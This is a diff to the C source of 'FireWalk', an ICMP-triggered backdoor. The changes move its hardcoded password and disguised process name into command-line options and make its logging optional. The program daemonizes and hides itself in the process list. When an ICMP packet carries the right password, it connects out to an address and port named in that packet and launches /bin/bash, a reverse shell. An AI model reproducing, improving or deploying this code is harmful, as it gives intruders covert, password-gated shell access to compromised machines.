@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <popt.h>
 #include <unistd.h>
 #include <syslog.h>
 #include <signal.h>
@@ -14,7 +15,8 @@
 #include <arpa/inet.h>
 
 
-
+#define TRUE 1
+#define FALSE 0
 #define STDIN 0
 #define STDOUT 1
 #define STERR 2
@@ -22,17 +24,10 @@
 #define PASSLEN 8
 
 
-// password
-#define PASS "fwalk"
-// Name of the process in /bin/ps output.
-#define HIDE "[events/4]"
-
-
 // GLOBALS
 int sockfd;
 int ready;
 void (*logger)(int, const char *, ...);
-char password[] = PASS;
 
 struct icmp_payload {
     char pass[PASSLEN];
@@ -40,33 +35,46 @@ struct icmp_payload {
     int port;
 } *icmpdata;
 
-
+struct cmdopts {
+    const char *passwd;
+    const char *pname;
+    int logging;
+}cmdline;
 
 // PROTOTYPES
+void parseopts(int argc, char *argv[], struct cmdopts *);
 int process_packet(void);
 char * sock_to_host(const struct sockaddr *, socklen_t);
 void launch_shell(const char *, int);
 static void sigchld_hdlr(int );
+void dumblogger(int, const char *, ...);
 
 
 
 int main(int argc, char *argv[])
 {
 
-    char *IDENT = "FireWalker";
+    char *IDENT = "FireWalk";
     fd_set allset, rset;
     struct sigaction signal;
 
 
+    parseopts(argc, argv, &cmdline);
+
     // Hide process name in ps list
-    strcpy(argv[0], HIDE);
+    strcpy(argv[0], cmdline.pname);
 
     // Daemonize
     if ((daemon(0, 0) < 0))
         exit(1);
 
-    logger = syslog;
-    openlog(IDENT, LOG_CONS | LOG_PID, LOG_DAEMON);
+    if (cmdline.logging == TRUE) {
+        logger = syslog;
+        openlog(IDENT, LOG_CONS | LOG_PID, LOG_DAEMON);
+    }
+    else {
+        logger = dumblogger;
+    }
 
     memset(&signal, 0, sizeof(signal));
     signal.sa_handler = sigchld_hdlr;
@@ -97,21 +105,86 @@ int main(int argc, char *argv[])
 }
 
 
+void parseopts(int argc, char *argv[], struct cmdopts *opts)
+{
+    char c;
+    opts->logging = FALSE;
+    poptContext optcon;
+    struct poptOption options[] = {
+        { "log", 'l', POPT_ARG_NONE, 0, 'l',
+        "Use system logging"},
+        POPT_AUTOHELP
+        { NULL, 0, 0, NULL, 0}
+    };
+    optcon = poptGetContext(NULL, argc, (const char **)argv, options, 0);
+    poptSetOtherOptionHelp(optcon, "[OPTIONS] <name> <password>");
+    if (argc < 3) {
+        poptPrintHelp(optcon, stderr, 0);
+        exit(1);
+    }
+    while ((c = poptGetNextOpt(optcon)) >= 0) {
+        if (c == 'l') {
+            opts->logging = TRUE;
+        }
+        else {
+            poptPrintHelp(optcon, stderr, 0);
+            exit(1);
+        }
+    }
+
+    if (c < -1) {
+        fprintf(stderr, "%s: %s\n",
+                poptBadOption(optcon, POPT_BADOPTION_NOALIAS),
+                poptStrerror(c));
+        exit(1);
+    }
+    opts->pname = poptGetArg(optcon);
+    opts->passwd = poptGetArg(optcon);
+    if (strlen(opts->passwd) > 8) {
+            poptPrintHelp(optcon, stderr, 0);
+            fprintf(stderr, "Password is too long!\n");
+            exit(1);
+    }
+    if (!(poptPeekArg(optcon) == NULL)) {
+        poptPrintHelp(optcon, stderr, 0);
+        fprintf(stderr, "Extra arguments given\n");
+        exit(1);
+    }
+    if (opts->pname == NULL) {
+        poptPrintHelp(optcon, stderr, 0);
+        fprintf(stderr, "Specify a process name\n");
+        exit(1);
+    }
+    if (opts->passwd == NULL) {
+        poptPrintHelp(optcon, stderr, 0);
+        fprintf(stderr, "Specify a password\n");
+        exit(1);
+    }
+    
+    poptFreeContext(optcon);
+    return;
+}
+
 int process_packet(void) 
 {
     //char rbuf[sizeof(struct iphdr) + sizeof(struct icmp)];
-    int i, hlen1, hlen2, icmplen, sport;
+    int hlen1, icmplen;
     char buf[MAXLINE];
     char *addr;
     ssize_t n;
     socklen_t len;
-    struct ip *ip, *hip;
+    struct ip *ip;
     struct icmp *icmp;
-    struct sockaddr_in from, dest;
+    struct sockaddr_in from;
     //struct icmpd_err icmpd_err;
-
-    logger = syslog;
     len = sizeof(from);
+
+    if (cmdline.logging == TRUE) {
+        logger = syslog;
+    }
+    else {
+        logger = dumblogger;
+    }
 
     //logger(LOG_INFO, "Reading from socket...");
     n = recvfrom(sockfd, buf, MAXLINE, 0, (struct sockaddr*) &from, &len);
@@ -135,7 +208,7 @@ int process_packet(void)
     addr = inet_ntoa(icmpdata->addr);
     logger(LOG_INFO, "Password = %s", icmpdata->pass);
 
-    if ( (strcmp(icmpdata->pass, password)) == 0) {
+    if ( (strcmp(icmpdata->pass, cmdline.passwd)) == 0) {
         logger(LOG_INFO, "Passwords match!");
         launch_shell(addr, icmpdata->port);
     }
@@ -143,7 +216,7 @@ int process_packet(void)
         logger(LOG_INFO, "Passwords DO NOT match!");
     }
   
-    return(0);
+    return 0;
 } 
 
 
@@ -170,11 +243,11 @@ char * sock_to_host(const struct sockaddr *sa, socklen_t salen)
     if (sa->sa_family == AF_INET) {
         struct sockaddr_in *sin = (struct sockaddr_in *) sa;
         if (inet_ntop(AF_INET, &sin->sin_addr, str, sizeof(str)) == NULL)
-            return(NULL);
-        return(str);
+            return NULL;
+        return str;
     }
 
-    return(NULL);
+    return NULL;
 }
 
 //
@@ -197,7 +270,13 @@ void launch_shell(const char *addr, int port)
         int r1, r2, r3;
         struct sockaddr_in servaddr;
         
-        logger = syslog;
+        if (cmdline.logging == TRUE) {
+            logger = syslog;
+        }
+        else {
+            logger = dumblogger;
+        }
+
         logger(LOG_INFO, "Launching the shell connection!");
         logger(LOG_INFO, "Shell IP = %s\n", addr);
         logger(LOG_INFO, "Shell Port = %d\n", port);
@@ -234,4 +313,10 @@ void launch_shell(const char *addr, int port)
         execl("/bin/bash", "bash", (char *)0);
     }
 
+}
+
+void dumblogger(int a, const char *b, ...)
+{
+    printf("Dumb logger called!\n");
+    return;
 }
